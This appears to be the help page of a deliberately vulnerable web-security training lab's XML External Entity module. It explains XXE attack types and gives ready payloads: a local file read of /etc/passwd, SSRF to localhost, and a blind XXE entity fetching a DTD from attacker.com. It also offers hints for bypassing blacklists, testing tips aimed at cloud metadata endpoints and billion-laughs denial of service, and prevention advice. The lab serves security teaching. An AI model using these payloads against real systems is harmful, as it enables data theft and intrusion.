<div class="body_padded">
	<h1>Help - XML External Entity (XXE)</h1>

	<div id="code">
		<table width='100%' bgcolor='white' style="border:2px #C0C0C0 solid">
			<tr>
				<td><div id="code">
					<h3>About</h3>
					<p>An XML External Entity (XXE) attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser.</p>
					
					<p>XXE attacks can be used to extract data, execute remote requests from the server, scan internal systems, perform denial-of-service attacks, and potentially execute remote code.</p>

					<h3>XXE Attack Types</h3>
					<ul>
						<li><strong>Classic XXE:</strong> Direct retrieval of files via ENTITY declarations</li>
						<li><strong>Blind XXE:</strong> No direct output, requires out-of-band data exfiltration</li>
						<li><strong>Error-based XXE:</strong> Trigger XML parsing errors to leak data</li>
						<li><strong>XXE via File Upload:</strong> Upload malicious XML files (SVG, DOCX, etc.)</li>
					</ul>

					<h3>Common XXE Payloads</h3>
					<p><strong>Read local files:</strong></p>
					<pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE user [
  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;user&gt;
  &lt;name&gt;&xxe;&lt;/name&gt;
  &lt;email&gt;test@example.com&lt;/email&gt;
&lt;/user&gt;</pre>

					<p><strong>SSRF via XXE:</strong></p>
					<pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE user [
  &lt;!ENTITY xxe SYSTEM "http://localhost:8080/admin"&gt;
]&gt;
&lt;user&gt;
  &lt;name&gt;&xxe;&lt;/name&gt;
&lt;/user&gt;</pre>

					<p><strong>Parameter Entities (Blind XXE):</strong></p>
					<pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE user [
  &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
  &lt;!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"&gt;
  %dtd;
]&gt;
&lt;user&gt;&lt;name&gt;test&lt;/name&gt;&lt;/user&gt;</pre>

					<h3>Impact</h3>
					<ul>
						<li>Arbitrary file disclosure (e.g., /etc/passwd, config files, source code)</li>
						<li>Server-Side Request Forgery (SSRF) to internal services</li>
						<li>Denial of Service via billion laughs attack</li>
						<li>Port scanning of internal network</li>
						<li>Remote Code Execution (in some configurations)</li>
					</ul>

					<br /><hr /><br />

					<h3>Objective</h3>
					<p>Your goal is to exploit the XXE vulnerability to:</p>
					<ul>
						<li><strong>Low:</strong> Read server files using external entities</li>
						<li><strong>Medium:</strong> Bypass basic keyword filtering</li>
						<li><strong>High:</strong> Bypass sophisticated URI scheme and path blacklist</li>
						<li><strong>Impossible:</strong> Understand proper XXE prevention</li>
					</ul>

					<br /><hr /><br />

					<h3>Low Level</h3>
					<p>The low level has no XXE protection. XML is parsed with LIBXML_NOENT and LIBXML_DTDLOAD flags, allowing external entity processing.</p>
					<p><em>Spoiler:</em> <span class="spoiler">Use DOCTYPE with ENTITY declarations to read files like /etc/passwd or /etc/hostname</span></p>

					<br />

					<h3>Medium Level</h3>
					<p>The medium level implements a basic blacklist that blocks keywords like "<!ENTITY", "SYSTEM", and "PUBLIC" using case-insensitive matching.</p>
					<p><em>Spoiler:</em> <span class="spoiler">The blacklist uses stripos() which is case-insensitive, so simple case variations won't work. However, you might try alternative approaches like using parameter entities with external DTD files, UTF-16 encoding to bypass string detection, or exploring edge cases in XML parsing. In many real implementations, encoding-based bypasses can work.</span></p>

					<br />

					<h3>High Level</h3>
					<p>The high level implements a more sophisticated blacklist that blocks common URI schemes (file://, php://, expect://, data://) and sensitive paths (/etc/passwd, /etc/shadow). It also uses libxml_use_internal_errors() to suppress error messages.</p>
					<p>However, it still uses LIBXML_NOENT and LIBXML_DTDLOAD flags, making it vulnerable to XXE attacks if you can find files or paths not in the blacklist.</p>
					<p><em>Spoiler:</em> <span class="spoiler">The blacklist only blocks specific URI schemes and paths. Try reading other system files like /etc/hostname, /etc/hosts, /proc/version, or use alternative wrappers. You can also try uppercase encoding or URL encoding to bypass string matching, though stripos is case-insensitive.</span></p>

					<br />

					<h3>Impossible Level</h3>
					<p>The impossible level properly prevents XXE by:</p>
					<ul>
						<li>Using CSRF token for form submission</li>
						<li>Calling libxml_disable_entity_loader(true)</li>
						<li>Using LIBXML_NONET flag (blocks network access) and LIBXML_NOCDATA</li>
						<li>NOT using LIBXML_NOENT or LIBXML_DTDLOAD flags</li>
						<li>Explicitly blocking DOCTYPE declarations</li>
						<li>Proper error handling with libxml_use_internal_errors()</li>
					</ul>
					<p>This combination effectively prevents all XXE attacks.</p>

					<br />

					<h3>Defense Strategies</h3>
					<ul>
						<li><strong>Disable external entities:</strong> Use libxml_disable_entity_loader(true) in PHP</li>
						<li><strong>Use safe parser flags:</strong> Avoid LIBXML_NOENT and LIBXML_DTDLOAD</li>
						<li><strong>Use LIBXML_NONET:</strong> Prevents network access during parsing</li>
						<li><strong>Block DOCTYPE:</strong> Reject XML containing DOCTYPE declarations</li>
						<li><strong>Input validation:</strong> Validate XML structure against XSD schema</li>
						<li><strong>Use JSON instead:</strong> When possible, use JSON instead of XML</li>
						<li><strong>Keep libraries updated:</strong> Update XML parsing libraries regularly</li>
						<li><strong>Principle of least privilege:</strong> Run XML parser with minimal permissions</li>
					</ul>

					<br />

					<h3>Testing Tips</h3>
					<ul>
						<li>Test with file:///etc/passwd on Linux</li>
						<li>Test with file:///c:/windows/win.ini on Windows</li>
						<li>Try PHP wrappers like php://filter/convert.base64-encode/resource=/etc/passwd</li>
						<li>Test SSRF with http://localhost or http://169.254.169.254</li>
						<li>Try billion laughs attack for DoS testing</li>
					</ul>

					<br />

					<h3>References</h3>
					<ul>
						<li><?php echo dvwaExternalLinkUrlGet( 'https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing', 'OWASP - XXE Processing' ); ?></li>
						<li><?php echo dvwaExternalLinkUrlGet( 'https://portswigger.net/web-security/xxe', 'PortSwigger - XXE' ); ?></li>
						<li><?php echo dvwaExternalLinkUrlGet( 'https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html', 'OWASP XXE Prevention Cheat Sheet' ); ?></li>
						<li><?php echo dvwaExternalLinkUrlGet( 'https://phonexicum.github.io/infosec/xxe.html', 'XXE Attack Examples' ); ?></li>
						<li><?php echo dvwaExternalLinkUrlGet( 'https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity', 'HackTricks - XXE' ); ?></li>
					</ul>
				</div></td>
			</tr>
		</table>
	</div>
</div>
